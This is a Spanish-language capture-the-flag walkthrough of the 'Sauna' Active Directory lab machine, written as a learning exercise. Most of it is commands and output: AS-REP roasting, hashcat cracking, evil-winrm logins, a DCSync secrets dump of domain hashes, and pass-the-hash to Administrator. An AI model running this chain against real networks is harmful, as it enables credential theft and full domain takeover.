# Resolución maquina sauna

**Autor:** PepeMaquina  
**Fecha:** 10 de octubre de 2025  
**Dificultad:** Easy 
**Sistema Operativo:** Windows
**Tags:** Asproast, Creds, Bloodhound,

---

## Imagen de la Máquina
![[cicada.jpg]]
*Imagen: sauna.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.175 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 10.10.10.175 -oN targeted
~~~
### Enumeración de Servicios

~~~bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 05:00:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=10/10%Time=68E98212%P=x86_64-pc-linux-gnu%r(DNS
SF:-SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x0
SF:4_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-11T05:01:29
|_  start_date: N/A
~~~
### Enumeración de nombre del dominio
En este apartado, se realizó la enumeración del nombre de dominio y host con la herramienta netexec y credenciales nulas y/o guest.
~~~ bash
sudo netexec smb 10.10.10.175 -u '' -p ''                                        
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
~~~
Con ello ya guardamos la ip y el dominio con su respectivo host
~~~ bash
cat /etc/hosts
127.0.0.1       localhost
<SNIP>
10.10.10.175 EGOTISTICAL-BANK.LOCAL SAUNA SAUNA.EGOTISTICAL-BANK.LOCAL
~~~
### Enumeración detallada de los servicios 
Lo primero que hago cuando tengo un dominio es enumeración de usuarios por fuerza bruta utilizando kerbrute, de esa forma la dejo corriendo para ver que usuarios se puede obtener.
~~~
./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
~~~
Mientras enumera, se intenta obtener algo entrando como usuario anónimo o probando credenciales nulas.
~~~bash
sudo netexec smb 10.10.10.175 -u '' -p '' --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
~~~
Luego se enumera con credenciales guest
~~~bash
sudo netexec smb 10.10.10.175 -u 'as' -p '' --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\as: STATUS_LOGON_FAILURE
~~~
Con las dos formas probadas, no se obtuvo nada de información posible.
Ahora, revisando la enumeración de kerbrute se pudo encontrar un usuario valido.
~~~bash
./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/10/25 - Ronnie Flathers @ropnop

2025/10/10 18:06:40 >  Using KDC(s):
2025/10/10 18:06:40 >   10.10.10.175:88

2025/10/10 18:07:18 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2025/10/10 18:10:53 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2025/10/10 18:11:26 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2025/10/10 18:13:27 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/10/10 18:33:26 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
~~~
Lo que hago es añadir a todos los usuarios en un archivo.

### Asproast
lo primero que hago probar un ataque asproast.
~~~bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2d<SNIP>44
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
~~~
Con esto se pudo obtener un hash del usuario fsmith, al intentar el descifrado de esta se nos otorgo una contraseña que vale la pena probar.
~~~bash
hashcat -m 18200 hash_smith /usr/share/wordlists/rockyou.txt                   
<SNIP>
* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2d<SNIP>44:T<SNIP>3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2d7296e...8aae44
Time.Started.....: Fri Oct 10 18:37:05 2025 (14 secs)
Time.Estimated...: Fri Oct 10 18:37:19 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   764.2 kH/s (0.72ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10537984/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Throy1 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 53%

Started: Fri Oct 10 18:36:40 2025
Stopped: Fri Oct 10 18:37:20 2025
~~~
Con la contraseña, vale la pena probarlas para ver a que servicios tiene acceso.
Probando las credenciales para winrm se ve que tiene acceso.
~~~bash
sudo netexec winrm 10.10.10.175 -u 'fsmith' -p pass
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:T<SNIP>3 (Pwn3d!)
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con las ultimas credenciales ya probadas y verificadas, se prueba intentar obtener acceso mediante winrm, obteniendo asi la user flag.
~~~powershell
evil-winrm -i 10.10.10.175 -u fsmith -p 'T<SNIP>3'                        
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd desktop
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
<Encuentre su user flag>
~~~

---
## Escalada de Privilegios

### Enumeración de escalada automatizada
Al revisar los permisos y/o privilegios de manera manual no se pudo encontrar nada importante, entonces pasando a utilizar winpeas, se encontraron algunas credenciales.
~~~powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winpeasx64.exe
<SNIP>
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Mo<SNIP>d!

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
<SNIP>
~~~
Como siempre digo, toda contraseña que se encuentra, se la guarda.

### Acceso al usuario svc_loanmgr
Se probaron las credenciales con winrm para el usuario svc_loanmgr, descubriendo que si son credenciales validas.
~~~powerahell
evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Mo<SNIP>d!'   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
~~~
Revisando y realizando enumeración manual no se pudo encontrar nada útil ni importante, de igual manera usando una herramienta como winpeas, por lo que se recurrio a realizar un analisis con bloodhound.
~~~bash
bloodhound-python -u svc_loanmgr -p 'Mo<SNIP>d!' -c All -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
~~~

### Aprovechando DCSync
Al ver los permisos del usuario svc_loanmgr, se puede ver que tiene permisos dcsync sobre el dominio, por lo que aprovechando ese permiso de procede a dumpear toda la base de datos NTDS.
![[sauna2.jpg]]
~~~
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Mo<SNIP>d!'@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:82<SNIP>8e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:3<SNIP>c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a<SNIP>2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:c7<SNIP>47:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
<SNIP>
~~~
De esa forma de obtiene el hash NTLM de administrator.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Iniciando sesion con winrm y el hash NTLM obtenida se puede ver la root flag, que es el objetivo de la maquina.
~~~powershell
evil-winrm -i 10.10.10.175 -u administrator -H 82<SNIP>8e
                                    
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
<Encuentre su propio root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

